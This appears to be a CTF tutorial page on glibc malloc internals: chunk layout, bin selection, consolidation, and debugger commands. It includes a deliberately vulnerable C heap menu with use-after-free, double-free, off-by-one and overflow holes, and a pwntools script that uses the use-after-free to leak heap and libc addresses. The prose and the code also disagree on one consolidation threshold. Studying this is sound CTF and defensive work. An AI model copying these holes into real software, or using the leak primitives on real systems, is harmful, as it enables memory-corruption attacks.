---
title: "glibc malloc Internals - The Parts a CTF Player Actually Needs"
category: pwn
subcategory: heap
type: technique
tags: [heap, glibc, malloc, free, chunk, tcache, fastbin, unsorted-bin, smallbin, largebin, top-chunk, consolidation, malloc-chunk, arena, main-arena, pwndbg, gef, pwntools, vis-heap-chunks]
difficulty: easy
summary: "Chunk layout, size math, every bin, top chunk and consolidation - the mental model every other heap technique is built on."
when_to_use:
  - "You are starting a heap challenge and need to predict where a freed chunk goes"
  - "You need to compute the request size that lands in a specific bin"
  - "A `malloc(): ...` or `free(): ...` abort message fired and you need to know which check tripped"
  - "You want to read pwndbg `heap`/`bins` output and understand it"
tools: [pwndbg, gef, pwntools, gdb]
related: [heap-tcache-poisoning, heap-unsorted-bin-leak, glibc-heap-cheatsheet, heap-version-differences]
---

## TL;DR

glibc's allocator keeps freed chunks on singly- or doubly-linked lists ("bins") whose
pointers live *inside the freed user data*. Every heap attack is: get a write into a
freed chunk's metadata, or make the allocator believe a region is a chunk when it is not.
This file is the map: chunk layout, size math, which bin a free goes to, and when chunks merge.

## Recognise it

- The binary has a menu with `alloc / free / show / edit` and stores pointers in a global array.
- `checksec` shows Full RELRO and NX - so the intended path is heap, not GOT overwrite.
- The challenge ships its own `libc.so.6` and `ld.so`: the exact version decides which attacks live.
- `strings ./libc.so.6 | grep -i "GNU C Library"` gives you the version. Everything depends on it.

## Vulnerable code shape

```c
/* The canonical CTF heap menu. Every bug class below hides in one of these lines. */
#define MAX 16
static char *ptr[MAX];
static size_t sz[MAX];

void do_alloc(void) {
    int i, n;
    scanf("%d", &i);
    scanf("%d", &n);
    ptr[i] = malloc(n);          /* no bounds check on i -> OOB write into ptr[] */
    sz[i]  = n;
    read(0, ptr[i], n);          /* sometimes read(0, ptr[i], n + 1) -> off-by-one */
}

void do_free(void) {
    int i;
    scanf("%d", &i);
    free(ptr[i]);                /* ptr[i] not NULLed -> UAF + double free */
}

void do_edit(void) {
    int i;
    scanf("%d", &i);
    read(0, ptr[i], sz[i]);      /* if sz[] is stale -> heap overflow */
}

void do_show(void) {
    int i;
    scanf("%d", &i);
    puts(ptr[i]);                /* reads a freed chunk -> fd/bk leak */
}
```

## Theory

Targets: everything here is true for glibc 2.26 - 2.39 unless a version is called out.
Pre-2.26 has no tcache; that is the single biggest behavioural split.

### malloc_chunk

```c
struct malloc_chunk {
  INTERNAL_SIZE_T mchunk_prev_size;  /* size of PREVIOUS chunk, only valid if it is free */
  INTERNAL_SIZE_T mchunk_size;       /* size of THIS chunk, low 3 bits are flags     */
  struct malloc_chunk* fd;           /* free only: forward pointer                    */
  struct malloc_chunk* bk;           /* free only: backward pointer                   */
  struct malloc_chunk* fd_nextsize;  /* free + largebin only                          */
  struct malloc_chunk* bk_nextsize;  /* free + largebin only                          */
};
```

On x86-64 every field is 8 bytes. The pointer `malloc()` hands you is
`chunk_address + 0x10`, i.e. it points at where `fd` would be. That is why a freed
chunk's `fd`/`bk` are readable with the *same* index the program used while it was live -
this is the whole UAF leak primitive.

The low 3 bits of `mchunk_size` are flags:

| bit | value | name | meaning |
|-----|-------|------|---------|
| 0 | 0x1 | `PREV_INUSE` (P) | the *previous* (lower-address) chunk is in use |
| 1 | 0x2 | `IS_MMAPPED` (M) | chunk came from `mmap`, `free` calls `munmap` |
| 2 | 0x4 | `NON_MAIN_ARENA` (A) | chunk belongs to a thread arena, not `main_arena` |

So a 0x90-byte chunk following an in-use chunk has `size == 0x91`.

### Size math

```
chunksize = max(0x20, (request + 8 + 0xF) & ~0xF)
```

The `+ 8` is the header (`size` only - `prev_size` is *borrowed* from the next chunk when
the current chunk is in use, which is why `malloc(0x18)` still fits in a 0x20 chunk).
Useful landmarks:

| request | chunksize | bin |
|---------|-----------|-----|
| 0x00 - 0x18 | 0x20 | tcache idx 0 / fastbin idx 0 |
| 0x19 - 0x28 | 0x30 | tcache idx 1 |
| 0x58 - 0x68 | 0x70 | tcache idx 5, last fastbin by default |
| 0x78 - 0x88 | 0x90 | tcache idx 7, smallbin |
| 0x3F8 - 0x408 | 0x410 | last tcache bin (idx 63) |
| 0x409+ | 0x420+ | NOT tcache - goes to unsorted then largebin |

That last row is the single most useful fact in heap CTF: **request >= 0x409 skips tcache
entirely**, so `malloc(0x418)`/`free` gives you an unsorted-bin libc leak without
having to fill seven tcache entries first.

### Bins, in the order free() consults them

1. **tcache** (glibc >= 2.26). 64 bins, sizes 0x20..0x410, **7 entries each**
   (`TCACHE_MAX_BINS=64`, `TCACHE_FILL_COUNT=7`). Singly linked via `fd` (called `next`).
   Per-thread, stored in a `tcache_perthread_struct` that is itself the **first heap
   allocation** (0x290 on 2.30+, 0x250 on 2.26-2.29). Almost no security checks before
   2.29. This is where most CTF exploits live.
2. **fastbins**. Sizes 0x20..0x80 by default (`global_max_fast = 0x80`). Singly linked
   via `fd`. Chunks here keep `PREV_INUSE` set on the next chunk, so they never
   consolidate until `malloc_consolidate()` runs.
3. **unsorted bin**. A single circular doubly-linked list, the staging area. Anything
   too big for tcache/fastbin lands here first. Its `fd`/`bk` point back into
   `main_arena`, which is the classic libc leak.
4. **smallbins**. 62 bins, one exact size each, 0x20..0x3F0. Circular doubly linked,
   FIFO (insert at head via `bk`, serve from tail).
5. **largebins**. Sizes >= 0x400, each bin covers a *range*. Sorted descending by size
   using the extra `fd_nextsize`/`bk_nextsize` pointers, which chain only the
   *first chunk of each distinct size*. That extra chaining is what the largebin
   attack corrupts.
6. **top chunk** (the "wilderness"). The remainder of the heap. Never in a bin.
   Serving from it is just a pointer bump; `size` is the amount left.

Requests above `mp_.mmap_threshold` (128 KB, dynamically raised) bypass all of this and
go to `mmap()` directly - `IS_MMAPPED` is set and `free` unmaps them. In CTF this
mostly matters because a huge allocation gives you a page at a *predictable offset from libc*.

### Consolidation

`_int_free` on a non-fastbin, non-tcache chunk does:

- **Backward**: if `!prev_inuse(P)`, take `prev_size`, `unlink()` the previous chunk and merge.
- **Forward**: if the next chunk is not the top chunk and the chunk after that has
  `PREV_INUSE` clear, `unlink()` the next chunk and merge.
- If the merged chunk borders top, it is absorbed into top instead of being binned.

`unlink()` carries the famous check:

```c
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
  malloc_printerr ("corrupted double-linked list");
```

`malloc_consolidate()` flushes *all* fastbins through this path. It is triggered by a
`malloc` that has to touch the unsorted bin for a large request, or by `free` of a
chunk >= 0x10000. This is how "fastbin dup consolidate" works.

## Attack

There is no single attack here - this is the primer. But the sequence below is the one
you run first on every heap challenge to fingerprint the allocator:

1. `malloc(0x18)` -> A. Note the address: `heap_base + 0x2a0` means tcache struct is
   0x290, so glibc >= 2.30. `heap_base + 0x260` means 0x250, so 2.26 - 2.29.
2. `free(A)`, then `show(A)`. If you get 8 bytes back and they look like a *small*
   number (e.g. `0x55e4c1`), safe-linking is on -> glibc >= 2.32.
   If you get a raw heap pointer, glibc <= 2.31.
3. `malloc(0x418)` -> B, `malloc(0x18)` -> guard (stops B merging into top).
4. `free(B)`, `show(B)` -> a `main_arena` pointer. Libc leak, no tcache filling needed.
5. `free(B)` again. `free(): double free detected in tcache 2` means tcache key is
   present (2.29+). Nothing at all means 2.26-2.28.
6. Allocate 9 chunks of 0x88 and free all 9: the first 7 go to tcache, the last 2
   consolidate into one unsorted chunk. `bins` in pwndbg confirms the split.

## Heap state

```text
A fresh heap after malloc(0x18) on glibc 2.35:

heap_base +0x000  +--------------------------------+
                  | prev_size = 0                  |
          +0x008  | size      = 0x291 (P)          |  <- tcache_perthread_struct chunk
          +0x010  | counts[64] (uint16 x 64)       |
          +0x090  | entries[64] (ptr x 64)         |
          +0x290  +--------------------------------+
                  | prev_size = 0                  |
          +0x298  | size      = 0x21 (P)           |  <- chunk A
          +0x2a0  | user data  <-- malloc returns  |
          +0x2b0  +--------------------------------+
                  | prev_size = 0                  |
          +0x2b8  | size      = 0x20d51 (P)        |  <- top chunk (wilderness)
                  | ...                            |
                  +--------------------------------+

After free(A) (tcache, glibc >= 2.32 mangled fd):

          +0x298  | size = 0x21 (P)                |
          +0x2a0  | next = PROTECT_PTR(&A->next,0) |  <- (heap>>12) ^ 0, looks like 0x55e4c1
          +0x2a8  | key  = tcache_key              |  <- double-free tripwire
          +0x2b0  +--------------------------------+
   tcache->counts[0] = 1 ; tcache->entries[0] = A(=heap+0x2a0)

A 0x420 chunk freed with a guard behind it (unsorted bin):

          | size = 0x421 (P)               |
          | fd = &main_arena.bins[0] (=main_arena+0x60) |  <- LIBC LEAK
          | bk = &main_arena.bins[0]                    |
```

## Exploit

Two pieces: a pure-python size/bin calculator you can import into any exploit, and a
pwntools driver that fingerprints a live heap binary.

```python
#!/usr/bin/env python3
"""glibc malloc geometry helpers + a live-binary fingerprint driver.

Usage:
    python3 heap_internals.py                 # run the self-tests only
    python3 heap_internals.py ./chal          # fingerprint a local menu binary
"""
import sys

MALLOC_ALIGN = 0x10
SIZE_SZ = 8
MINSIZE = 0x20
TCACHE_MAX_BINS = 64
TCACHE_FILL_COUNT = 7
DEFAULT_GLOBAL_MAX_FAST = 0x80

PREV_INUSE = 0x1
IS_MMAPPED = 0x2
NON_MAIN_ARENA = 0x4
SIZE_BITS = PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA


def chunksize(request: int) -> int:
    """Real chunk size for malloc(request) on x86-64."""
    if request < 0:
        raise ValueError("negative request")
    need = request + SIZE_SZ
    rounded = (need + MALLOC_ALIGN - 1) & ~(MALLOC_ALIGN - 1)
    return max(MINSIZE, rounded)


def max_request_for(size: int) -> int:
    """Largest malloc() argument that still produces a chunk of exactly `size`."""
    if size % MALLOC_ALIGN or size < MINSIZE:
        raise ValueError("not a legal chunk size")
    return size - SIZE_SZ


def min_request_for(size: int) -> int:
    """Smallest malloc() argument that produces a chunk of exactly `size`."""
    if size <= MINSIZE:
        return 0
    return size - SIZE_SZ - (MALLOC_ALIGN - 1)


def tcache_index(size: int) -> int:
    """tcache bin index for a chunk size, or -1 if it does not fit tcache."""
    if size < MINSIZE or size > 0x410 or size % MALLOC_ALIGN:
        return -1
    return (size - MINSIZE) // MALLOC_ALIGN


def bin_for(size: int, global_max_fast: int = DEFAULT_GLOBAL_MAX_FAST,
            tcache_full: bool = False) -> str:
    """Where does free() put a chunk of this size?"""
    if not tcache_full and tcache_index(size) >= 0:
        return "tcache[%d]" % tcache_index(size)
    if size <= global_max_fast:
        return "fastbin[%d]" % ((size - MINSIZE) // MALLOC_ALIGN)
    if size >= 0x20000:
        return "unsorted (and triggers malloc_consolidate)"
    if size < 0x400:
        return "unsorted -> smallbin[%d]" % ((size // MALLOC_ALIGN) - 2)
    return "unsorted -> largebin"


def smallest_unsorted_request() -> int:
    """Smallest malloc() argument whose free() skips tcache entirely (-> 0x420)."""
    return min_request_for(0x420)  # 0x409


def _selftest() -> None:
    assert chunksize(0) == 0x20
    assert chunksize(0x18) == 0x20
    assert chunksize(0x19) == 0x30
    assert chunksize(0x28) == 0x30
    assert chunksize(0x68) == 0x70
    assert chunksize(0x88) == 0x90
    assert chunksize(0x408) == 0x410
    assert chunksize(0x409) == 0x420
    assert tcache_index(0x20) == 0
    assert tcache_index(0x410) == 63
    assert tcache_index(0x420) == -1
    assert bin_for(0x20) == "tcache[0]"
    assert bin_for(0x20, tcache_full=True) == "fastbin[0]"
    assert bin_for(0x90, tcache_full=True).startswith("unsorted -> smallbin")
    assert bin_for(0x420).startswith("unsorted -> largebin")
    assert chunksize(smallest_unsorted_request()) == 0x420
    assert smallest_unsorted_request() == 0x409
    assert max_request_for(0x420) == 0x418
    assert chunksize(max_request_for(0x420)) == 0x420
    print("[+] geometry self-tests passed")
    for req in (0x10, 0x18, 0x28, 0x58, 0x68, 0x88, 0xF8, 0x408, 0x409, 0x1000):
        cs = chunksize(req)
        print("    malloc(%#5x) -> chunk %#6x  free() -> %s" % (req, cs, bin_for(cs)))


def fingerprint(binary_path: str) -> None:
    """Drive a standard alloc/free/show/edit menu and print the allocator fingerprint."""
    from pwn import context, process, remote, ELF, args, u64, p64  # noqa: F401

    context.binary = elf = ELF(binary_path, checksec=False)
    context.log_level = args.LOG or "info"
    io = remote(args.HOST or "127.0.0.1", int(args.PORT or 1337)) if args.REMOTE \
        else process([binary_path])

    def menu(choice):
        io.sendlineafter(b"> ", str(choice).encode())

    def alloc(idx, size, data=b"A"):
        menu(1); io.sendlineafter(b"idx: ", str(idx).encode())
        io.sendlineafter(b"size: ", str(size).encode())
        io.sendafter(b"data: ", data)

    def free(idx):
        menu(2); io.sendlineafter(b"idx: ", str(idx).encode())

    def show(idx):
        menu(3); io.sendlineafter(b"idx: ", str(idx).encode())
        return io.recvline().rstrip(b"\n")

    # 1. tcache struct size tells you the glibc era.
    alloc(0, 0x18, b"A" * 8)
    free(0)
    leak = show(0).ljust(8, b"\x00")
    first = u64(leak[:8])
    print("[*] first tcache fd = %#x" % first)
    if first and first < 0x1000000:
        print("[+] safe-linking active -> glibc >= 2.32")
    elif first == 0:
        print("[+] fd == 0, single chunk, no safe-linking -> glibc <= 2.31")

    # 2. 0x409+ skips tcache: instant libc leak.
    alloc(1, 0x418, b"B" * 8)
    alloc(2, 0x18, b"guard")
    free(1)
    arena_leak = u64(show(1).ljust(8, b"\x00")[:8])
    print("[*] unsorted fd (main_arena+0x60) = %#x" % arena_leak)

    io.interactive()


if __name__ == "__main__":
    _selftest()
    if len(sys.argv) > 1:
        fingerprint(sys.argv[1])
    else:
        print("[*] pass a binary path to run the live fingerprint")
```

## Variants & pitfalls

- **Thread arenas.** If the challenge spawns a thread, allocations come from a
  non-main arena created by `mmap`, `NON_MAIN_ARENA` is set, and the arena struct sits
  at a fixed offset inside that mapping - not inside libc. Your `main_arena` leak
  arithmetic will be wrong.
- **`tcache_perthread_struct` is a normal chunk.** You can free it, poison into it, or
  overwrite `counts[]`/`entries[]` directly. Overwriting `entries[i]` is the cleanest
  arbitrary-allocation primitive in existence, because it dodges every fd check.
- **Calloc skips tcache.** `calloc()` goes straight to `_int_malloc`, so a poisoned
  tcache entry is *not* consumed by calloc. Challenges use this deliberately.
- **`prev_size` overlap.** When a chunk is in use, its `prev_size` field is used as the
  last 8 bytes of the *previous* chunk's user data. An off-by-eight is therefore a
  full metadata write.
- **Alignment.** From 2.34 malloc rejects a tcache entry that is not 16-byte aligned
  (`malloc(): unaligned tcache chunk detected`), killing the old `__malloc_hook-0x23` trick.

## Debugging

```bash
# Confirm the libc version shipped with the challenge.
strings ./libc.so.6 | grep -m1 "GNU C Library"

# Patch the binary to use the provided libc/ld so your local heap matches remote.
pwninit --bin ./chal --libc ./libc.so.6 --ld ./ld-2.35.so
```

```text
pwndbg> heap                 # walk every chunk from heap base to top
pwndbg> bins                 # tcache + fastbins + unsorted + small + large, all at once
pwndbg> tcache               # the tcache_perthread_struct, decoded
pwndbg> arena                # main_arena fields (top, last_remainder, bins[])
pwndbg> vis_heap_chunks 20   # the colour-coded hexdump you actually want
pwndbg> top_chunk            # address and remaining size of the wilderness
pwndbg> p &main_arena
pwndbg> p (int)&((struct malloc_chunk*)0)->fd

gef>  heap chunks
gef>  heap bins
gef>  heap bins tcache
gef>  heap arenas
```

## Tools

- `pwndbg` - `heap`, `bins`, `tcache`, `vis_heap_chunks`, `try_free <addr>` (tells you
  exactly which check a free would trip).
- `gef` - `heap chunks`, `heap bins`, `heap-analysis-helper` (logs every malloc/free).
- `pwninit` / `patchelf` - bind the binary to the challenge's libc.
- `one_gadget ./libc.so.6` - once you have a libc leak and a hook.
- `libc-database` / `libc.rip` - identify libc from a leaked symbol offset.

## References

- shellphish `how2heap` - runnable demos of every technique, per glibc version.
- CTF Wiki, Linux user-mode heap section.
- glibc source: `malloc/malloc.c` (`_int_malloc`, `_int_free`, `sysmalloc`, `tcache_get`/`tcache_put`).
